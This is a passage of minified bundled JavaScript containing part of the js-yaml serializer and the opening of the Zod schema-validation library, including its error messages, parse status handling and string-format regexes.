`,W=Y&&(X[X.length-2]===`
`||X===`
`),z=W?"+":Y?"":"-";return Q+z+`
`}function l3(X){return X[X.length-1]===`
`?X.slice(0,-1):X}function tC(X,J){var Q=/(\n+)([^\n]*)/g,Y=function(){var K=X.indexOf(`
`);return K=K!==-1?K:X.length,Q.lastIndex=K,p3(X.slice(0,K),J)}(),W=X[0]===`
`||X[0]===" ",z,G;while(G=Q.exec(X)){var H=G[1],U=G[2];z=U[0]===" ",Y+=H+(!W&&!z&&U!==""?`
`:"")+p3(U,J),W=z}return Y}function p3(X,J){if(X===""||X[0]===" ")return X;var Q=/ [^ ]/g,Y,W=0,z,G=0,H=0,U="";while(Y=Q.exec(X)){if(H=Y.index,H-W>J)z=G>W?G:H,U+=`
`+X.slice(W,z),W=z+1;G=H}if(U+=`
`,X.length-W>J&&G>W)U+=X.slice(W,G)+`
`+X.slice(G+1);else U+=X.slice(W);return U.slice(1)}function eC(X){var J="",Q=0,Y;for(var W=0;W<X.length;Q>=65536?W+=2:W++)if(Q=n7(X,W),Y=j9[Q],!Y&&t7(Q)){if(J+=X[W],Q>=65536)J+=X[W+1]}else J+=Y||pC(Q);return J}function XP(X,J,Q){var Y="",W=X.tag,z,G,H;for(z=0,G=Q.length;z<G;z+=1){if(H=Q[z],X.replacer)H=X.replacer.call(Q,String(z),H);if(Z6(X,J,H,!1,!1)||typeof H==="undefined"&&Z6(X,J,null,!1,!1)){if(Y!=="")Y+=","+(!X.condenseFlow?" ":"");Y+=X.dump}}X.tag=W,X.dump="["+Y+"]"}function d3(X,J,Q,Y){var W="",z=X.tag,G,H,U;for(G=0,H=Q.length;G<H;G+=1){if(U=Q[G],X.replacer)U=X.replacer.call(Q,String(G),U);if(Z6(X,J+1,U,!0,!0,!1,!0)||typeof U==="undefined"&&Z6(X,J+1,null,!0,!0,!1,!0)){if(!Y||W!=="")W+=HY(X,J);if(X.dump&&s7===X.dump.charCodeAt(0))W+="-";else W+="- ";W+=X.dump}}X.tag=z,X.dump=W||"[]"}function JP(X,J,Q){var Y="",W=X.tag,z=Object.keys(Q),G,H,U,K,V;for(G=0,H=z.length;G<H;G+=1){if(V="",Y!=="")V+=", ";if(X.condenseFlow)V+='"';if(U=z[G],K=Q[U],X.replacer)K=X.replacer.call(Q,U,K);if(!Z6(X,J,U,!1,!1))continue;if(X.dump.length>1024)V+="? ";if(V+=X.dump+(X.condenseFlow?'"':"")+":"+(X.condenseFlow?"":" "),!Z6(X,J,K,!1,!1))continue;V+=X.dump,Y+=V}X.tag=W,X.dump="{"+Y+"}"}function QP(X,J,Q,Y){var W="",z=X.tag,G=Object.keys(Q),H,U,K,V,B,Z;if(X.sortKeys===!0)G.sort();else if(typeof X.sortKeys==="function")G.sort(X.sortKeys);else if(X.sortKeys)throw new h9("sortKeys must be a boolean or a function");for(H=0,U=G.length;H<U;H+=1){if(Z="",!Y||W!=="")Z+=HY(X,J);if(K=G[H],V=Q[K],X.replacer)V=X.replacer.call(Q,K,V);if(!Z6(X,J+1,K,!0,!0,!0))continue;if(B=X.tag!==null&&X.tag!=="?"||X.dump&&X.dump.length>1024,B)if(X.dump&&s7===X.dump.charCodeAt(0))Z+="?";else Z+="? ";if(Z+=X.dump,B)Z+=HY(X,J);if(!Z6(X,J+1,V,!0,B))continue;if(X.dump&&s7===X.dump.charCodeAt(0))Z+=":";else Z+=": ";Z+=X.dump,W+=Z}X.tag=z,X.dump=W||"{}"}function i3(X,J,Q){var Y,W,z,G,H,U;W=Q?X.explicitTypes:X.implicitTypes;for(z=0,G=W.length;z<G;z+=1)if(H=W[z],(H.instanceOf||H.predicate)&&(!H.instanceOf||typeof J==="object"&&J instanceof H.instanceOf)&&(!H.predicate||H.predicate(J))){if(Q)if(H.multi&&H.representName)X.tag=H.representName(J);else X.tag=H.tag;else X.tag="?";if(H.represent){if(U=X.styleMap[H.tag]||H.defaultStyle,HU.call(H.represent)==="[object Function]")Y=H.represent(J,U);else if(UU.call(H.represent,U))Y=H.represent[U](J,U);else throw new h9("!<"+H.tag+'> tag resolver accepts not "'+U+'" style');X.dump=Y}return!0}return!1}function Z6(X,J,Q,Y,W,z,G){if(X.tag=null,X.dump=Q,!i3(X,Q,!1))i3(X,Q,!0);var H=HU.call(X.dump),U=Y,K;if(Y)Y=X.flowLevel<0||X.flowLevel>J;var V=H==="[object Object]"||H==="[object Array]",B,Z;if(V)B=X.duplicates.indexOf(Q),Z=B!==-1;if(X.tag!==null&&X.tag!=="?"||Z||X.indent!==2&&J>0)W=!1;if(Z&&X.usedDuplicates[B])X.dump="*ref_"+B;else{if(V&&Z&&!X.usedDuplicates[B])X.usedDuplicates[B]=!0;if(H==="[object Object]"){if(Y&&Object.keys(X.dump).length!==0){if(QP(X,J,X.dump,W),Z)X.dump="&ref_"+B+X.dump}else if(JP(X,J,X.dump),Z)X.dump="&ref_"+B+" "+X.dump}else if(H==="[object Array]"){if(Y&&X.dump.length!==0){if(X.noArrayIndent&&!G&&J>0)d3(X,J-1,X.dump,W);else d3(X,J,X.dump,W);if(Z)X.dump="&ref_"+B+X.dump}else if(XP(X,J,X.dump),Z)X.dump="&ref_"+B+" "+X.dump}else if(H==="[object String]"){if(X.tag!=="?")oC(X,X.dump,J,z,U)}else if(H==="[object Undefined]")return!1;else{if(X.skipInvalid)return!1;throw new h9("unacceptable kind of an object to dump "+H)}if(X.tag!==null&&X.tag!=="?"){if(K=encodeURI(X.tag[0]==="!"?X.tag.slice(1):X.tag).replace(/!/g,"%21"),X.tag[0]==="!")K="!"+K;else if(K.slice(0,18)==="tag:yaml.org,2002:")K="!!"+K.slice(18);else K="!<"+K+">";X.dump=K+" "+X.dump}}return!0}function YP(X,J){var Q=[],Y=[],W,z;KY(X,Q,Y);for(W=0,z=Y.length;W<z;W+=1)J.duplicates.push(Q[Y[W]]);J.usedDuplicates=new Array(z)}function KY(X,J,Q){var Y,W,z;if(X!==null&&typeof X==="object")if(W=J.indexOf(X),W!==-1){if(Q.indexOf(W)===-1)Q.push(W)}else if(J.push(X),Array.isArray(X))for(W=0,z=X.length;W<z;W+=1)KY(X[W],J,Q);else{Y=Object.keys(X);for(W=0,z=Y.length;W<z;W+=1)KY(X[Y[W]],J,Q)}}function WP(X,J){J=J||{};var Q=new iC(J);if(!Q.noRefs)YP(X,Q);var Y=X;if(Q.replacer)Y=Q.replacer.call({"":Y},"",Y);if(Z6(Q,0,Y,!0,!0))return Q.dump+`
`;return""}var GP=WP,zP={dump:GP};function MY(X,J){return function(){throw new Error("Function yaml."+X+" is removed in js-yaml 4. Use yaml."+J+" instead, which is now safe by default.")}}var{load:RU,loadAll:Mc1}=zU,Fc1=zP.dump;var jc1=MY("safeLoad","load"),Oc1=MY("safeLoadAll","loadAll"),Rc1=MY("safeDump","dump");var _1={};Y9(_1,{void:()=>dP,util:()=>F0,unknown:()=>lP,union:()=>aP,undefined:()=>mP,tuple:()=>tP,transformer:()=>US,symbol:()=>yP,string:()=>SU,strictObject:()=>nP,setErrorMap:()=>VP,set:()=>JS,record:()=>eP,quotelessJson:()=>UP,promise:()=>HS,preprocess:()=>BS,pipeline:()=>qS,ostring:()=>ZS,optional:()=>KS,onumber:()=>MS,oboolean:()=>FS,objectUtil:()=>FY,object:()=>rP,number:()=>TU,nullable:()=>VS,null:()=>uP,never:()=>pP,nativeEnum:()=>zS,nan:()=>fP,map:()=>XS,makeIssue:()=>e7,literal:()=>WS,lazy:()=>YS,late:()=>vP,isValid:()=>h6,isDirty:()=>dQ,isAsync:()=>jJ,isAborted:()=>pQ,intersection:()=>oP,instanceof:()=>xP,getParsedType:()=>l8,getErrorMap:()=>FJ,function:()=>QS,enum:()=>GS,effect:()=>US,discriminatedUnion:()=>sP,defaultErrorMap:()=>M6,datetimeRegex:()=>IU,date:()=>hP,custom:()=>PU,coerce:()=>jS,boolean:()=>_U,bigint:()=>gP,array:()=>iP,any:()=>cP,addIssueToContext:()=>C1,ZodVoid:()=>J5,ZodUnknown:()=>y6,ZodUnion:()=>DJ,ZodUndefined:()=>NJ,ZodType:()=>B0,ZodTuple:()=>d8,ZodTransformer:()=>D8,ZodSymbol:()=>X5,ZodString:()=>R8,ZodSet:()=>LX,ZodSchema:()=>B0,ZodRecord:()=>Q5,ZodReadonly:()=>_J,ZodPromise:()=>DX,ZodPipeline:()=>G5,ZodParsedType:()=>L1,ZodOptional:()=>N8,ZodObject:()=>u0,ZodNumber:()=>m6,ZodNullable:()=>j6,ZodNull:()=>LJ,ZodNever:()=>p8,ZodNativeEnum:()=>PJ,ZodNaN:()=>W5,ZodMap:()=>Y5,ZodLiteral:()=>CJ,ZodLazy:()=>IJ,ZodIssueCode:()=>q1,ZodIntersection:()=>wJ,ZodFunction:()=>RJ,ZodFirstPartyTypeKind:()=>o1,ZodError:()=>m9,ZodEnum:()=>c6,ZodEffects:()=>D8,ZodDiscriminatedUnion:()=>iQ,ZodDefault:()=>SJ,ZodDate:()=>AX,ZodCatch:()=>TJ,ZodBranded:()=>rQ,ZodBoolean:()=>AJ,ZodBigInt:()=>u6,ZodArray:()=>A8,ZodAny:()=>NX,Schema:()=>B0,ParseStatus:()=>B9,OK:()=>O9,NEVER:()=>OS,INVALID:()=>r1,EMPTY_PATH:()=>BP,DIRTY:()=>RX,BRAND:()=>bP});var F0;(function(X){X.assertEqual=(W)=>{};function J(W){}X.assertIs=J;function Q(W){throw new Error}X.assertNever=Q,X.arrayToEnum=(W)=>{let z={};for(let G of W)z[G]=G;return z},X.getValidEnumValues=(W)=>{let z=X.objectKeys(W).filter((H)=>typeof W[W[H]]!=="number"),G={};for(let H of z)G[H]=W[H];return X.objectValues(G)},X.objectValues=(W)=>{return X.objectKeys(W).map(function(z){return W[z]})},X.objectKeys=typeof Object.keys==="function"?(W)=>Object.keys(W):(W)=>{let z=[];for(let G in W)if(Object.prototype.hasOwnProperty.call(W,G))z.push(G);return z},X.find=(W,z)=>{for(let G of W)if(z(G))return G;return},X.isInteger=typeof Number.isInteger==="function"?(W)=>Number.isInteger(W):(W)=>typeof W==="number"&&Number.isFinite(W)&&Math.floor(W)===W;function Y(W,z=" | "){return W.map((G)=>typeof G==="string"?`'${G}'`:G).join(z)}X.joinValues=Y,X.jsonStringifyReplacer=(W,z)=>{if(typeof z==="bigint")return z.toString();return z}})(F0||(F0={}));var FY;(function(X){X.mergeShapes=(J,Q)=>{return{...J,...Q}}})(FY||(FY={}));var L1=F0.arrayToEnum(["string","nan","number","integer","float","boolean","date","bigint","symbol","function","undefined","null","array","object","unknown","promise","void","never","map","set"]),l8=(X)=>{switch(typeof X){case"undefined":return L1.undefined;case"string":return L1.string;case"number":return Number.isNaN(X)?L1.nan:L1.number;case"boolean":return L1.boolean;case"function":return L1.function;case"bigint":return L1.bigint;case"symbol":return L1.symbol;case"object":if(Array.isArray(X))return L1.array;if(X===null)return L1.null;if(X.then&&typeof X.then==="function"&&X.catch&&typeof X.catch==="function")return L1.promise;if(typeof Map!=="undefined"&&X instanceof Map)return L1.map;if(typeof Set!=="undefined"&&X instanceof Set)return L1.set;if(typeof Date!=="undefined"&&X instanceof Date)return L1.date;return L1.object;default:return L1.unknown}};var q1=F0.arrayToEnum(["invalid_type","invalid_literal","custom","invalid_union","invalid_union_discriminator","invalid_enum_value","unrecognized_keys","invalid_arguments","invalid_return_type","invalid_date","invalid_string","too_small","too_big","invalid_intersection_types","not_multiple_of","not_finite"]),UP=(X)=>{return JSON.stringify(X,null,2).replace(/"([^"]+)":/g,"$1:")};class m9 extends Error{get errors(){return this.issues}constructor(X){super();this.issues=[],this.addIssue=(Q)=>{this.issues=[...this.issues,Q]},this.addIssues=(Q=[])=>{this.issues=[...this.issues,...Q]};let J=new.target.prototype;if(Object.setPrototypeOf)Object.setPrototypeOf(this,J);else this.__proto__=J;this.name="ZodError",this.issues=X}format(X){let J=X||function(W){return W.message},Q={_errors:[]},Y=(W)=>{for(let z of W.issues)if(z.code==="invalid_union")z.unionErrors.map(Y);else if(z.code==="invalid_return_type")Y(z.returnTypeError);else if(z.code==="invalid_arguments")Y(z.argumentsError);else if(z.path.length===0)Q._errors.push(J(z));else{let G=Q,H=0;while(H<z.path.length){let U=z.path[H];if(H!==z.path.length-1)G[U]=G[U]||{_errors:[]};else G[U]=G[U]||{_errors:[]},G[U]._errors.push(J(z));G=G[U],H++}}};return Y(this),Q}static assert(X){if(!(X instanceof m9))throw new Error(`Not a ZodError: ${X}`)}toString(){return this.message}get message(){return JSON.stringify(this.issues,F0.jsonStringifyReplacer,2)}get isEmpty(){return this.issues.length===0}flatten(X=(J)=>J.message){let J={},Q=[];for(let Y of this.issues)if(Y.path.length>0){let W=Y.path[0];J[W]=J[W]||[],J[W].push(X(Y))}else Q.push(X(Y));return{formErrors:Q,fieldErrors:J}}get formErrors(){return this.flatten()}}m9.create=(X)=>{return new m9(X)};var KP=(X,J)=>{let Q;switch(X.code){case q1.invalid_type:if(X.received===L1.undefined)Q="Required";else Q=`Expected ${X.expected}, received ${X.received}`;break;case q1.invalid_literal:Q=`Invalid literal value, expected ${JSON.stringify(X.expected,F0.jsonStringifyReplacer)}`;break;case q1.unrecognized_keys:Q=`Unrecognized key(s) in object: ${F0.joinValues(X.keys,", ")}`;break;case q1.invalid_union:Q="Invalid input";break;case q1.invalid_union_discriminator:Q=`Invalid discriminator value. Expected ${F0.joinValues(X.options)}`;break;case q1.invalid_enum_value:Q=`Invalid enum value. Expected ${F0.joinValues(X.options)}, received '${X.received}'`;break;case q1.invalid_arguments:Q="Invalid function arguments";break;case q1.invalid_return_type:Q="Invalid function return type";break;case q1.invalid_date:Q="Invalid date";break;case q1.invalid_string:if(typeof X.validation==="object")if("includes"in X.validation){if(Q=`Invalid input: must include "${X.validation.includes}"`,typeof X.validation.position==="number")Q=`${Q} at one or more positions greater than or equal to ${X.validation.position}`}else if("startsWith"in X.validation)Q=`Invalid input: must start with "${X.validation.startsWith}"`;else if("endsWith"in X.validation)Q=`Invalid input: must end with "${X.validation.endsWith}"`;else F0.assertNever(X.validation);else if(X.validation!=="regex")Q=`Invalid ${X.validation}`;else Q="Invalid";break;case q1.too_small:if(X.type==="array")Q=`Array must contain ${X.exact?"exactly":X.inclusive?"at least":"more than"} ${X.minimum} element(s)`;else if(X.type==="string")Q=`String must contain ${X.exact?"exactly":X.inclusive?"at least":"over"} ${X.minimum} character(s)`;else if(X.type==="number")Q=`Number must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${X.minimum}`;else if(X.type==="bigint")Q=`Number must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${X.minimum}`;else if(X.type==="date")Q=`Date must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${new Date(Number(X.minimum))}`;else Q="Invalid input";break;case q1.too_big:if(X.type==="array")Q=`Array must contain ${X.exact?"exactly":X.inclusive?"at most":"less than"} ${X.maximum} element(s)`;else if(X.type==="string")Q=`String must contain ${X.exact?"exactly":X.inclusive?"at most":"under"} ${X.maximum} character(s)`;else if(X.type==="number")Q=`Number must be ${X.exact?"exactly":X.inclusive?"less than or equal to":"less than"} ${X.maximum}`;else if(X.type==="bigint")Q=`BigInt must be ${X.exact?"exactly":X.inclusive?"less than or equal to":"less than"} ${X.maximum}`;else if(X.type==="date")Q=`Date must be ${X.exact?"exactly":X.inclusive?"smaller than or equal to":"smaller than"} ${new Date(Number(X.maximum))}`;else Q="Invalid input";break;case q1.custom:Q="Invalid input";break;case q1.invalid_intersection_types:Q="Intersection results could not be merged";break;case q1.not_multiple_of:Q=`Number must be a multiple of ${X.multipleOf}`;break;case q1.not_finite:Q="Number must be finite";break;default:Q=J.defaultError,F0.assertNever(X)}return{message:Q}},M6=KP;var AU=M6;function VP(X){AU=X}function FJ(){return AU}var e7=(X)=>{let{data:J,path:Q,errorMaps:Y,issueData:W}=X,z=[...Q,...W.path||[]],G={...W,path:z};if(W.message!==void 0)return{...W,path:z,message:W.message};let H="",U=Y.filter((K)=>!!K).slice().reverse();for(let K of U)H=K(G,{data:J,defaultError:H}).message;return{...W,path:z,message:H}},BP=[];function C1(X,J){let Q=FJ(),Y=e7({issueData:J,data:X.data,path:X.path,errorMaps:[X.common.contextualErrorMap,X.schemaErrorMap,Q,Q===M6?void 0:M6].filter((W)=>!!W)});X.common.issues.push(Y)}class B9{constructor(){this.value="valid"}dirty(){if(this.value==="valid")this.value="dirty"}abort(){if(this.value!=="aborted")this.value="aborted"}static mergeArray(X,J){let Q=[];for(let Y of J){if(Y.status==="aborted")return r1;if(Y.status==="dirty")X.dirty();Q.push(Y.value)}return{status:X.value,value:Q}}static async mergeObjectAsync(X,J){let Q=[];for(let Y of J){let W=await Y.key,z=await Y.value;Q.push({key:W,value:z})}return B9.mergeObjectSync(X,Q)}static mergeObjectSync(X,J){let Q={};for(let Y of J){let{key:W,value:z}=Y;if(W.status==="aborted")return r1;if(z.status==="aborted")return r1;if(W.status==="dirty")X.dirty();if(z.status==="dirty")X.dirty();if(W.value!=="__proto__"&&(typeof z.value!=="undefined"||Y.alwaysSet))Q[W.value]=z.value}return{status:X.value,value:Q}}}var r1=Object.freeze({status:"aborted"}),RX=(X)=>({status:"dirty",value:X}),O9=(X)=>({status:"valid",value:X}),pQ=(X)=>X.status==="aborted",dQ=(X)=>X.status==="dirty",h6=(X)=>X.status==="valid",jJ=(X)=>typeof Promise!=="undefined"&&X instanceof Promise;var f1;(function(X){X.errToObj=(J)=>typeof J==="string"?{message:J}:J||{},X.toString=(J)=>typeof J==="string"?J:J?.message})(f1||(f1={}));class L8{constructor(X,J,Q,Y){this._cachedPath=[],this.parent=X,this.data=J,this._path=Q,this._key=Y}get path(){if(!this._cachedPath.length)if(Array.isArray(this._key))this._cachedPath.push(...this._path,...this._key);else this._cachedPath.push(...this._path,this._key);return this._cachedPath}}var NU=(X,J)=>{if(h6(J))return{success:!0,data:J.value};else{if(!X.common.issues.length)throw new Error("Validation failed but no issues detected.");return{success:!1,get error(){if(this._error)return this._error;let Q=new m9(X.common.issues);return this._error=Q,this._error}}}};function G0(X){if(!X)return{};let{errorMap:J,invalid_type_error:Q,required_error:Y,description:W}=X;if(J&&(Q||Y))throw new Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);if(J)return{errorMap:J,description:W};return{errorMap:(G,H)=>{let{message:U}=X;if(G.code==="invalid_enum_value")return{message:U??H.defaultError};if(typeof H.data==="undefined")return{message:U??Y??H.defaultError};if(G.code!=="invalid_type")return{message:H.defaultError};return{message:U??Q??H.defaultError}},description:W}}class B0{get description(){return this._def.description}_getType(X){return l8(X.data)}_getOrReturnCtx(X,J){return J||{common:X.parent.common,data:X.data,parsedType:l8(X.data),schemaErrorMap:this._def.errorMap,path:X.path,parent:X.parent}}_processInputParams(X){return{status:new B9,ctx:{common:X.parent.common,data:X.data,parsedType:l8(X.data),schemaErrorMap:this._def.errorMap,path:X.path,parent:X.parent}}}_parseSync(X){let J=this._parse(X);if(jJ(J))throw new Error("Synchronous parse encountered promise.");return J}_parseAsync(X){let J=this._parse(X);return Promise.resolve(J)}parse(X,J){let Q=this.safeParse(X,J);if(Q.success)return Q.data;throw Q.error}safeParse(X,J){let Q={common:{issues:[],async:J?.async??!1,contextualErrorMap:J?.errorMap},path:J?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:l8(X)},Y=this._parseSync({data:X,path:Q.path,parent:Q});return NU(Q,Y)}"~validate"(X){let J={common:{issues:[],async:!!this["~standard"].async},path:[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:l8(X)};if(!this["~standard"].async)try{let Q=this._parseSync({data:X,path:[],parent:J});return h6(Q)?{value:Q.value}:{issues:J.common.issues}}catch(Q){if(Q?.message?.toLowerCase()?.includes("encountered"))this["~standard"].async=!0;J.common={issues:[],async:!0}}return this._parseAsync({data:X,path:[],parent:J}).then((Q)=>h6(Q)?{value:Q.value}:{issues:J.common.issues})}async parseAsync(X,J){let Q=await this.safeParseAsync(X,J);if(Q.success)return Q.data;throw Q.error}async safeParseAsync(X,J){let Q={common:{issues:[],contextualErrorMap:J?.errorMap,async:!0},path:J?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:l8(X)},Y=this._parse({data:X,path:Q.path,parent:Q}),W=await(jJ(Y)?Y:Promise.resolve(Y));return NU(Q,W)}refine(X,J){let Q=(Y)=>{if(typeof J==="string"||typeof J==="undefined")return{message:J};else if(typeof J==="function")return J(Y);else return J};return this._refinement((Y,W)=>{let z=X(Y),G=()=>W.addIssue({code:q1.custom,...Q(Y)});if(typeof Promise!=="undefined"&&z instanceof Promise)return z.then((H)=>{if(!H)return G(),!1;else return!0});if(!z)return G(),!1;else return!0})}refinement(X,J){return this._refinement((Q,Y)=>{if(!X(Q))return Y.addIssue(typeof J==="function"?J(Q,Y):J),!1;else return!0})}_refinement(X){return new D8({schema:this,typeName:o1.ZodEffects,effect:{type:"refinement",refinement:X}})}superRefine(X){return this._refinement(X)}constructor(X){this.spa=this.safeParseAsync,this._def=X,this.parse=this.parse.bind(this),this.safeParse=this.safeParse.bind(this),this.parseAsync=this.parseAsync.bind(this),this.safeParseAsync=this.safeParseAsync.bind(this),this.spa=this.spa.bind(this),this.refine=this.refine.bind(this),this.refinement=this.refinement.bind(this),this.superRefine=this.superRefine.bind(this),this.optional=this.optional.bind(this),this.nullable=this.nullable.bind(this),this.nullish=this.nullish.bind(this),this.array=this.array.bind(this),this.promise=this.promise.bind(this),this.or=this.or.bind(this),this.and=this.and.bind(this),this.transform=this.transform.bind(this),this.brand=this.brand.bind(this),this.default=this.default.bind(this),this.catch=this.catch.bind(this),this.describe=this.describe.bind(this),this.pipe=this.pipe.bind(this),this.readonly=this.readonly.bind(this),this.isNullable=this.isNullable.bind(this),this.isOptional=this.isOptional.bind(this),this["~standard"]={version:1,vendor:"zod",validate:(J)=>this["~validate"](J)}}optional(){return N8.create(this,this._def)}nullable(){return j6.create(this,this._def)}nullish(){return this.nullable().optional()}array(){return A8.create(this)}promise(){return DX.create(this,this._def)}or(X){return DJ.create([this,X],this._def)}and(X){return wJ.create(this,X,this._def)}transform(X){return new D8({...G0(this._def),schema:this,typeName:o1.ZodEffects,effect:{type:"transform",transform:X}})}default(X){let J=typeof X==="function"?X:()=>X;return new SJ({...G0(this._def),innerType:this,defaultValue:J,typeName:o1.ZodDefault})}brand(){return new rQ({typeName:o1.ZodBranded,type:this,...G0(this._def)})}catch(X){let J=typeof X==="function"?X:()=>X;return new TJ({...G0(this._def),innerType:this,catchValue:J,typeName:o1.ZodCatch})}describe(X){return new this.constructor({...this._def,description:X})}pipe(X){return G5.create(this,X)}readonly(){return _J.create(this)}isOptional(){return this.safeParse(void 0).success}isNullable(){return this.safeParse(null).success}}var qP=/^c[^\s-]{8,}$/i,ZP=/^[0-9a-z]+$/,MP=/^[0-9A-HJKMNP-TV-Z]{26}$/i,FP=/^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,jP=/^[a-z0-9_-]{21}$/i,OP=/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$/,RP=/^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/,AP=/^(?!\.)(?!.*\.\.)([A-Z0-9_'+\-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i,NP="^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$",jY,LP=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/,DP=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/(3[0-2]|[12]?[0-9])$/,wP=/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/,IP=/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/,CP=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/,PP=/^([0-9a-zA-Z-_]{4})*(([0-9a-zA-Z-_]{2}(==)?)|([0-9a-zA-Z-_]{3}(=)?))?$/,DU="((\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-((0[13578]|1[02])-(0[1-9]|[12]\\d|3[01])|(0[469]|11)-(0[1-9]|[12]\\d|30)|(02)-(0[1-9]|1\\d|2[0-8])))",SP=new RegExp(`^${DU}$`);function wU(X){let J="[0-5]\\d";if(X.precision)J=`${J}\\.\\d{${X.precision}}`;else if(X.precision==null)J=`${J}(\\.\\d+)?`;let Q=X.precision?"+":"?";return`([01]\\d|2[0-3]):[0-5]\\d(:${J})${Q}`}function TP(X){return new RegExp(`^${wU(X)}$`)}function IU(X){let J=`${DU}T${wU(X)}`,Q=[];if(Q.push(X.local?"Z?":"Z"),X.offset)Q.push("([+-]\\d{2}:?\\d{2})");return J=`${J}(${Q.join("|")})`,new RegExp(`^${J}$`)}function _P(X,J){if((J==="v4"||!J)&&LP.test(X))return!0;if((J==="v6"||!J)&&wP.test(X))return!0;return!1}function EP(X,J){if(!OP.test(X))return!1;try{let[Q]=X.split(".");if(!Q)return!1;let Y=Q.replace(/-/g,"+").replace(/_/g,"/").padEnd(Q.length+(4-Q.length%4)%4,"="),W=JSON.parse(atob(Y));if(typeof W!=="object"||W===null)return!1;if("typ"in W&&W?.typ!=="JWT")return!1;if(!W.alg)return!1;if(J&&W.alg!==J)return!1;return!0}catch{return!1}}function $P(X,J){if((J==="v4"||!J)&&DP.test(X))return!0;if((J==="v6"||!J)&&IP.test(X))return!0;return!1}class R8 extends B0{_parse(X){if(this._def.coerce)X.data=String(X.data);if(this._getType(X)!==L1.string){let W=this._getOrReturnCtx(X);return C1(W,{code:q1.invalid_type,expected:L1.string,received:W.parsedType}),r1}let Q=new B9,Y=void 0;for(let W of this._def.checks)if(W.kind==="min"){if(X.data.length<W.value)Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.too_small,minimum:W.value,type:"string",inclusive:!0,exact:!1,message:W.message}),Q.dirty()}else if(W.kind==="max"){if(X.data.length>W.value)Y=this._getOrReturnCtx(X,Y),C1(Y,{code:q1.too_big,maximum:W.value,type:"string",inclusive:!0,exact:!1,message:W.message}),Q.dirty()}else if(W.kind==="length"){let 